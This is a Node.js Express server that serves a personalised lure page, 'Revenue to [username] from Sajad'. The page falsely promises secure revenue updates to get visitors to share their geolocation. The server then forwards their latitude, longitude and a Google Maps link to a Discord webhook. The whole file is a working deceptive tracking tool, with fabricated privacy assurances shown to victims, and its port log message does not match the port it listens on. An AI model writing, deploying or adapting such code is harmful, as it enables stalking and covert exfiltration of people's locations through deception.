require("dotenv").config();
const express = require("express");
const app = express();
const bp = require("body-parser");
const cors = require("cors");
const axios = require("axios");

app.use(express.json());
app.use(bp.json());
app.use(bp.urlencoded({ extended: true }));
app.use(
  cors({
    origin: "*",
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"],
  })
);

// Discord Webhook URL
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;

// Ping route
app.get("/ping", (req, res) => {
  res.status(200).send({
    message: "Hello world",
    status: "OK",
    timestamp: new Date().toISOString(),
  });
});

// Route for username and location tracking
app.get("/:username", (req, res) => {
  const username = req.params.username;

  const clientSideScript = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="description" content="Revenue to ${username} from Sajad - A secure platform for location-based revenue updates.">
      <meta name="author" content="Sajad">
      <meta name="keywords" content="Revenue, Location, Secure, Trustworthy, ${username}, Sajad">
      <title>Revenue to ${username} from Sajad</title>
      <style>
        body {
          font-family: 'Arial', sans-serif;
          margin: 0;
          padding: 0;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          min-height: 100vh;
          background-color: #f8f9fa;
          text-align: center;
        }
        h1 {
          color: #0056b3;
          font-size: 2rem;
          margin-bottom: 1rem;
        }
        p {
          color: #6c757d;
          font-size: 1rem;
          margin-bottom: 1.5rem;
          line-height: 1.5;
        }
        .button-container {
          display: flex;
          justify-content: center;
        }
        button {
          padding: 12px 24px;
          background-color: #007bff;
          color: white;
          border: none;
          border-radius: 8px;
          font-size: 16px;
          cursor: pointer;
          transition: background-color 0.3s ease;
          box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
        }
        button:hover {
          background-color: #0056b3;
        }
        .footer {
          margin-top: 2rem;
          font-size: 0.9rem;
          color: #adb5bd;
        }
      </style>
    </head>
    <body>
      <h1>Welcome, ${username}!</h1>
      <p>To enhance your experience, please allow access to your location. This helps us securely calculate revenue updates tailored to your address.</p>
      <div class="button-container">
        <button id="allow-location">Allow My Location</button>
      </div>
      <div class="footer">
        Your location will be used securely and is protected under our privacy policy.
      </div>
      <script>
        document.getElementById("allow-location").addEventListener("click", () => {
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              const latitude = position.coords.latitude;
              const longitude = position.coords.longitude;

              // Send location data to the server
              await fetch("/sendLocation", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  username: "${username}",
                  latitude,
                  longitude,
                }),
              });
              alert("Thank you! Your location has been securely sent.");
            },
            (error) => {
              console.error("Error getting location:", error);
              alert("Failed to fetch location. Please ensure location access is enabled.");
            }
          );
        });
      </script>
    </body>
    </html>
  `;

  res.send(clientSideScript);
});


// Handle location data and send to Discord
app.post("/sendLocation", async (req, res) => {
  const { username, latitude, longitude } = req.body;

  if (!username || !latitude || !longitude) {
    return res.status(400).send("Missing data");
  }

  try {
    // Send location details to Discord
    await axios.post(DISCORD_WEBHOOK_URL, {
      content: `**New Location Update**\n\n**Username:** ${username}\n**Latitude:** ${latitude}\n**Longitude:** ${longitude}\n[View on Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
    });

    res.status(200).send("Location sent to Discord!");
  } catch (error) {
    console.error("Error sending to Discord:", error.message);
    res.status(500).send("Failed to send location to Discord");
  }
});

// Handle undefined routes
app.get("*", (req, res) =>
  res.status(404).json({
    error: "Not Found",
    message: "The requested API route does not exist.",
  })
);

app.post("*", (req, res) =>
  res.status(404).json({
    error: "Not Found",
    message: "The requested API route does not exist.",
  })
);

// Start the server
app.listen(3004, () => console.log("Server ready on port 3003."));

module.exports = app;
